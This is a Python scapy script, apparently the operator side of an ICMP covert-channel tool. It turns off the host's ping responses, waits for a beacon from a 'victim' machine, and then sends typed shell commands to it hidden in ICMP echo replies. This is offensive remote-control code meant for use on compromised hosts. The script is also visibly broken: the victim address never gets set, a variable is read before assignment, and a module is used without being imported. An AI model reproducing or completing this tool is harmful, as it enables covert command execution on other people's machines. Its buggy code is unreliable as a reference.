from scapy.all import *
import argparse
import os
import time

ICMP_ID = int(13331)
TTL = int(64)
ICMP_ID_HELO = int(23144)
my_iface = "ens160"
victim_ip = ""
active = False
 
def ignoreICMP():
    try:
        f = open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "w+")
        contents = f.read()
        if contents[0] != "1":
            os.system('echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
        f.close()
    except:
        print("[!] You need to run this tool with administrator privileges.")
        sys.exit() 

 
def IsActive(packet):
    global active
    if packet[ICMP].id == ICMP_ID_HELO:
        victim_ip = packet[IP].src
        active = True
        print("I am the victim and my ip is:" + victim_ip)
        time.sleep(0.3)
        send( IP(src=packet[IP].dst, dst=victim_ip)
            / ICMP(type=0, id=packet[ICMP].id, seq=packet[ICMP].seq)
            / "reply" )
        

def sendCommand(usr_cmd, packet):
    #packet = list(packet)
    #payload = packet[0][IP][Raw].load.decode('utf-8')
    
    send( IP(src=packet[IP].dst, dst=victim_ip)
        / ICMP(type=0, id=packet[0][ICMP].id, seq=packet[0][ICMP].seq)
        /usr_cmd)

    packet = sniff(iface=my_iface, filter="icmp", count=1)
    while packet[0][ICMP].id != ICMP_ID:
        packet = sniff(iface=my_iface, filter="icmp", count=1)

    while payload != 'end':
        send( IP(src=packet[IP].dst, dst=victim_ip)
        / ICMP(type=0, id=packet[0][ICMP].id, seq=packet[0][ICMP].seq)
        /"moreplz")

         

def main():
    ignoreICMP()
    
    while active == False:
        sniff(iface=my_iface, prn=IsActive, filter="icmp", timeout=1)
 
    while True:
        icmp_shell = input("shell: ")    
         
        if icmp_shell == "exit":
            break

        elif icmp_shell == "":
            pass
            
        else:
            packet = sniff(iface=my_iface, filter="icmp",count=1)
            sendCommand(icmp_shell, packet)


if __name__ == "__main__":
    main()